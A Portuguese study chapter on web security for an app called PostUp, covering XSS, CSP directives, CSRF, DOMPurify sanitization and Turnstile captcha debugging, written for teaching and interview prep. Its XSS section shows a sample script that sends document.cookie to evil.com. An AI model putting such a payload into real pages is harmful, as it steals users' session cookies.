# 09 — Segurança web: XSS, CSP, sanitização, captcha

> **Objetivo**: entender as ameaças do lado web e como o PostUp se defende —
> XSS, CSP, CSRF, sanitização com DOMPurify, e o captcha Turnstile.

## CONCEITO — O modelo de ameaça (sempre comece por aqui)

No PostUp, um atacante pode:

1. Criar conta e logar (porta pública).
2. Enviar textos (legendas, feedbacks, mensagens).
3. Fazer upload de mídias.
4. Acessar o link de review de um cliente.

**Defesa em camadas**: nenhuma camada sozinha protege — a soma delas sim.

## CONCEITO — XSS (Cross-Site Scripting)

**XSS**: injetar script que roda no navegador de OUTRO usuário.

```
Atacante insere:  <script>fetch('https://evil.com?cookie='+document.cookie)</script>
                 numa legenda de post
                        │
                        ▼
Gestor abre o post → o script roda → rouba cookies/token do gestor
```

Por que é grave: o script roda **no contexto do gestor logado** — pode ler a
sessão, agir como ele, vazar dados.

### As 3 formas de XSS (saber de cor para entrevista)
1. **Refletido**: o input aparece na resposta imediata (ex.: query string → página).
2. **Armazenado**: o input fica salvo no banco e é renderizado depois para outros
   (é o exemplo acima — o caso do PostUp).
3. **DOM-based**: o input manipula o DOM via JS sem passar pelo servidor.

## CONCEITO — Sanitização (a defesa do PostUp)

```ts
export function sanitize(input: string, maxLength = 2000): string {
  return DOMPurify.sanitize(input, { ALLOWED_TAGS: [] }).trim().slice(0, maxLength)
}
```

- **DOMPurify** é uma lib que "limpa" HTML/JS malicioso.
- **`ALLOWED_TAGS: []`** = NENHUMA tag permitida → remove TODO o HTML, fica só texto.
- Por que tão agressivo? O PostUp não precisa de rich text vindo de usuário —
  legendas/mensagens são texto puro. Remove tudo é mais simples e seguro que
  allowlist de tags.
- Combinado com **limite de tamanho** (2000) → impede payload gigante.

**Regra**: todo texto que será re-renderizado deve passar pelo `sanitize`.
É usado em mensagens de feedback, legendas, nomes — onde o app imprime o que
outro usuário digitou.

## CONCEITO — CSP (Content-Security-Policy)

CSP é um **header HTTP** (também pode ser meta tag) que diz ao navegador de onde
podem vir recursos: scripts, estilos, imagens, frames, conexões.

```
O que NÃO pode: <script src="https://evil.com/hack.js">
O que pode:     <script src="https://challenges.cloudflare.com/...">  (Turnstile)
```

Se um XSS acontecer, a CSP **bloqueia a execução** de scripts externos. É a
"rede de segurança" atrás da sanitização.

### A história real do PostUp (CSP vs Turnstile)
O captcha não carregava — a CSP estava bloqueando o domínio da Cloudflare.
A correção foi **liberar explicitamente** `challenges.cloudflare.com` (script,
frame, connect, img, worker), não desligar a CSP. Lição: **deny por padrão,
permita o mínimo necessário**.

### Capítulo 2: "Loading the font ... violates font-src 'self' data:"
O Turnstile carrega **fontes** também — e a CSP tem UMA diretiva por tipo de
recurso. Liberar o domínio no `script-src` **não libera** no `font-src`. O
`font-src 'self' data:` não incluía `challenges.cloudflare.com` → as fontes do
widget eram bloqueadas (40 violações no console).

A mesma auditoria encontrou outra vítima silenciosa: o **DM Sans do Google
Fonts** (`@import` no `src/index.css`) **nunca carregou de verdade** — o
`style-src` não tinha `fonts.googleapis.com` e o `font-src` não tinha
`fonts.gstatic.com`. O app renderizava com fonte fallback sem ninguém notar.

Correção (diretiva por diretiva):
```
style-src  → adicionar https://fonts.googleapis.com
font-src   → adicionar https://challenges.cloudflare.com
                                    https://fonts.gstatic.com
```

**Lição maior**: uma CSP é um conjunto de diretivas SEPARADAS (`script-src`,
`style-src`, `font-src`, `img-src`, `connect-src`, `frame-src`, `worker-src`,
`media-src`). Ao adicionar um recurso de terceiro, pense em **todas as diretivas
que ele pode tocar** — script, estilo, fonte, imagem, conexão, frame, worker.
Deny-by-default é ótimo, mas cobra essa auditoria a cada dependência nova.

## CONCEITO — CSRF (Cross-Site Request Forgery)

- **CSRF**: forçar o usuário LOGADO a executar uma ação sem querer
  (ex.: clicar num link que POSTa como ele).
- Defesa clássica: token CSRF (chave secreta no formulário/header).
- No PostUp: menos crítico porque o Supabase exige o token JWT no header
  (`Authorization: Bearer ...`) — o navegador não manda o JWT automaticamente em
  cross-origin (diferente de cookies). E o Supabase valida origem.

**Pontuação de entrevista**: saber que o modelo de tokens bearer é mais imune a
CSRF que cookies, e que CORS + políticas do Supabase reforçam.

## CONCEITO — Turnstile (o captcha do PostUp)

- **Problema**: bots criando contas e fazendo brute-force de senha.
- **Turnstile da Cloudflare**: captcha moderno (muitas vezes invisível/managed).
- **O padrão seguro** (o PostUp usa):

```
Frontend: TurnstileWidget gera um TOKEN (VITE_TURNSTILE_SITE_KEY)
   │
   ▼
Frontend → edge function verify-turnstile { token }
   │
   ▼
Edge (Deno): POST https://challenges.cloudflare.com/turnstile/v0/siteverify
             com TURNSTILE_SECRET_KEY
   │
   ▼
{ success: true/false } → front decide prosseguir
```

**Por que uma edge function?** O `TURNSTILE_SECRET_KEY` **nunca** pode ir ao
navegador. A validação precisa de um "servidor" (a edge function do Supabase).
Só o widget (chave pública) vai ao front.

### Detalhe de UX/segurança: token de uso único
O widget é **resetado a cada tentativa**. Se o mesmo token for reenviado, a
Cloudflare responde `timeout-or-duplicate` — tratamos com "verificação expirada,
resolva novamente". Isso impede reuso/recálculo do token.

### Diagnóstico: widget renderizou, mas o desafio falhou (erro 600010)
Caso real: o widget aparecia ("widget renderizado"), porém o desafio **não resolve** e o `error-callback` recebe **600010** — impossibilitando o login.

**Tabela de códigos (decorar os principais para entrevista):**
| Código | Significado | O que fazer |
|--------|-------------|-------------|
| 110100 / 110110 | Sitekey inválido / não encontrado | Conferir chave no dashboard |
| 110200 | Domínio não autorizado | Adicionar o host no Hostname Management |
| 400070 | Sitekey desabilitado | Ativar no dashboard |
| 200500 | iframe do Turnstile não carregou | Rede bloqueando challenges.cloudflare.com |
| 300* | Falha do desafio — comportamento de bot | Ambiente/navegador |
| 600* (600010) | Falha genérica do desafio | Ambiente/device marcado como bot |

**Como diagnosticamos o 600010 no PostUp** (a ordem importa — é o método):
1. O widget **renderizou** e o `sitekey` foi aceito → descarta sitekey inválido
   e domínio errado (esses dariam 110x/400x).
2. O console do desafio mostrava sinais de ambiente "estranho": `No available
   adapters` (WebGL/GPU indisponível), `Blocked script execution in
   'about:blank'... sandboxed`, erros `OTS parsing` de fontes.
3. Família 600 = falha do desafio/detecção de bot → **o ambiente do usuário
   estava sendo marcado** (VPN, proxy, extensão, VM, navegador com GPU
   desabilitada — típico de acesso remoto/sandbox).
4. Conclusão: era o ambiente de teste, não o código. Em navegador limpo
   (aba anônima, sem VPN/extensões) o desafio resolveu.

**Como a testkey ajudou a fechar o diagnóstico**: as chaves de teste da
Cloudflare (`1x...AA` = sempre passa, `2x...AB` = sempre falha, funcionam em
qualquer domínio) são o "controle" do experimento. O `TurnstileWidget` usa a
testkey `1x...AA` como fallback quando falta `VITE_TURNSTILE_SITE_KEY`. Se a
env var estivesse faltando, o comportamento seria outro (token dummy que o
servidor rejeita) — não 600010. Ver isso ajudou a provar que a chave real estava
em uso e o problema era o desafio em si.

**O que o app deve fazer com uma falha assim (nunca em silêncio):**
- `error-callback` mostra mensagem clara ao usuário (é o `onError` do
  `TurnstileWidget`, com o código exibido).
- O botão "Entrar" fica **bloqueado até existir token válido** — sem captcha,
  o servidor rejeitaria mesmo assim (edge function retornaria erro).
- A mensagem orienta o usuário: aba anônima, sem VPN/extensões, recarregar.

## CONCEITO — Ciclo de vida do token (o caso do "botão preso")

Bug real: "o captcha passa, mas o botão Entrar fica bloqueado". Causa raiz:

1. O `Login.tsx` criava `turnstileRef` mas **não passava `ref={turnstileRef}`**
   ao widget → `turnstileRef.current?.reset()` era um no-op silencioso.
2. Tentativa falha → `setCfToken('')` zera o token → botão desabilita
   (`disabled={loading || !cfToken}`).
3. Sem reset, o widget mantém o checkmark; o token de uso único foi consumido e
   Cloudflare não re-dispara `onSuccess` sem um reset → botão preso até reload.

**O ciclo correto do token (uso único):**

```
widget resolve → onSuccess(token) → botão libera → submit valida no servidor
→ descarta token + reset() do widget → próximo onSuccess gera token NOVO
```

Pontos que valem na entrevista:
- **Token é single-use**: reutilizar o mesmo token após validar → o servidor
  responde `timeout-or-duplicate`/`invalid-input-response`.
- **`ref?.metodo()` com ref null é no-op silencioso**: se o widget expõe um
  handle, o caminho precisa de teste (o teste de Login verifica o `reset`).
- **`onExpire`/`onTimeout` devem limpar o token guardado** — token velho mantido
  deixa o botão liberado para um submit que o servidor vai rejeitar.
- **`try/finally` em submit async**: sem ele, uma exceção deixa `loading=true`
  para sempre → botão congela com spinner.
- **Tela branca = erro não capturado**: ErrorBoundary global + logs de
  `error`/`unhandledrejection` transformam "tela branca sem mensagem" em erro
  visível e recuperável.

## CONCEITO — Erros de login: segurança vs UX

O PostUp diferencia "e-mail não registrado" de "senha errada".
- **Prós UX**: ajuda o usuário legítimo (não precisa de suporte).
- **Contra (segurança)**: permite **enumeração de e-mails** (atacante descobre
  quais e-mails têm conta).
- **Mitigação do PostUp**: captcha no cadastro + e-mail confirmado + contador de
  tentativas. Trade-off aceito e documentado.

**Pontuação de entrevista**: saber MENCIONAR que essa diferenciação tem trade-off
de segurança é um diferencial (mostra maturidade).

### Bug real: falha do captcha virando "senha incorreta"

Mesmo com a senha certa, o app dizia "A senha está incorreta". A causa **não era a
senha** — era a verificação do Turnstile no servidor falhando e o erro sendo
mascarado:

1. Edge `verify-turnstile` retornava **HTTP 400** em falha; o
   `supabase.functions.invoke` trata não-2xx como `error` e **descarta o corpo** —
   os `error-codes` do Cloudflare nunca chegavam ao client.
2. `verifyTurnstile` devolvia `{ error }` **sem código**; o `Login.tsx` tinha um
   `else` que assumia "senha errada" para **qualquer** erro não mapeado
   (`email_not_confirmed` era o único mapeado).

Fix em 3 camadas:
- **Edge**: falha retorna **200 + `{ success: false, error }`** (2xx → o client lê o corpo).
- **`use-auth`**: toda falha de captcha ganha `code: 'turnstile_failed'`.
- **UI**: `turnstile_failed` é tratado antes do `else` → mostra o erro real do captcha.

**Pontuação de entrevista**: "sempre propague um `code` até a UI — `else` genérico
que assume o erro mais comum é bug de UX". E: "não-2xx e corpo são canais
distintos; se o client precisa do motivo, use 200 + `success:false`".

## CONCEITO — Upload seguro

- Bucket `posts-media`: `file_size_limit 10485760` (10 MB), MIME types em allowlist
  (jpeg/png/webp/gif/mp4/webm).
- Compressão no cliente (`compress-image.ts`): redimensiona ≤1920px e converte para
  webp — reduz payload e o risco de arquivos gigantes.
- Storage com policies (anon/auth limitados ao bucket).

## PRATICAR

1. No app, crie um post com legenda `<script>alert('xss')</script>` e observe o
   resultado renderizado (deve aparecer o texto literal, não alert). Onde o
   `sanitize` é chamado?
2. Abra o `index.html` e liste TODAS as diretivas da CSP (script, style, font,
   img, connect, frame...). Quais domínios cada uma permite? O que você faria
   para adicionar o Google Analytics (script + connect)?
3. Leia `TurnstileWidget.tsx`: encontre o reset do token após erro. Por que o widget
   precisa ser "de uso único"?
4. No DevTools, inspecione uma requisição do Supabase: onde está o token JWT?
   Por que um script XSS conseguiria lê-lo (e por isso sanitizar importa)?
5. Simule o cenário 600010: no DevTools (Network) bloqueie o domínio
   `challenges.cloudflare.com` e recarregue o login. Compare o erro mostrado com
   o 600010 do ambiente — a mensagem do widget ajudaria o usuário a entender?
6. Desative WebGL no navegador (flag `--disable-webgl` no Chrome) e tente o
   login. Observe os logs do desafio — é o mesmo padrão "No available adapters"
   que vimos no 600010?
7. Simule o bug do "botão preso": zere o token no submit mas não resete o widget.
   Por que o botão fica bloqueado para sempre? Qual o teste que pegaria isso?
8. Desligue a rede no meio de um submit de login. O botão volta ao normal?
   (Esperado: sim — por causa do `try/finally`.)
9. Onde o erro "A senha está incorreta" seria exibido se a edge function falhasse
   com HTTP 400 (token rejeitado) **antes** da correção? E depois? Qual `code`
   a UI usa para não mascarar?

## ENTREVISTA — perguntas típicas

**"O que é XSS e como se proteger?"**
Estrutura: (1) injeção de script que roda no contexto do usuário vítima;
(2) tipos: refletido, armazenado, DOM; (3) defesa: sanitizar input (DOMPurify
com ALLOWED_TAGS:[]), nunca `dangerouslySetInnerHTML` com input não limpo,
CSP como rede de segurança; (4) exemplo real do PostUp: `sanitize()` em todos os
textos re-renderizados.

**"O que é CSP e por que usar?"**
Estrutura: (1) header que restringe origem de recursos; (2) defesa em profundidade
contra XSS (bloqueia script de origem não permitida); (3) deny-by-default;
(4) a lição real do PostUp: liberar o domínio do Turnstile sem desligar a CSP;
(5) as diretivas são SEPARADAS — `font-src`/`style-src`/`connect-src` precisam
de permissão própria (foi assim que o `font-src` bloqueou as fontes do widget e
o Google Fonts nunca carregou); (6) trade-off: CSP pode quebrar recursos de
terceiros se mal configurada.

**"Como funcionam captchas seguros (Turnstile/reCAPTCHA)?"**
Estrutura: (1) widget público gera token no front; (2) token é validado no SERVIDOR
com a chave secreta; (3) o segredo nunca vai ao navegador; (4) por isso o PostUp
tem a edge function `verify-turnstile`; (5) token de uso único evita reuso;
(6) por que um captcha "só no front" não funciona (bot chamaria a API direto).

**"O widget do seu captcha renderizou mas não resolve. Como você diagnosticaria?"**
Estrutura: (1) separar as causas: sitekey/domínio (erros 110x/400x) vs desafio
(300/600); (2) conferir no dashboard a chave e os domínios autorizados;
(3) ver os logs do desafio (WebGL, sandbox, rede); (4) 600010 = falha do desafio
→ ambiente marcado como bot (VPN/proxy/VM/extensão); (5) testar em aba anônima
sem extensões/VPN para isolar; (6) no app, tratar com mensagem clara e bloquear
o envio sem token válido.

**"Por que o botão de entrar ficou desabilitado mesmo com o captcha resolvido?"**
Estrutura: (1) o token é **uso único** e o botão depende de existir um token
válido; (2) bug real do PostUp: o `ref` de reset nunca foi passado ao widget →
após uma tentativa falha o token era zerado mas o widget não era resetado →
nenhum novo token chegava e o botão travava; (3) o `?.` com ref null é no-op
silencioso — por isso o caminho tem teste; (4) regra: validou → descartou →
reset → aguardar novo `onSuccess`; (5) `onExpire`/`onTimeout` também limpam o
token; (6) e nenhum submit async sem `try/finally` (loading preso congela o botão).

**Anterior**: [`08-rls-seguranca.md`](08-rls-seguranca.md) · **Próximo**: [`10-realtime.md`](10-realtime.md)
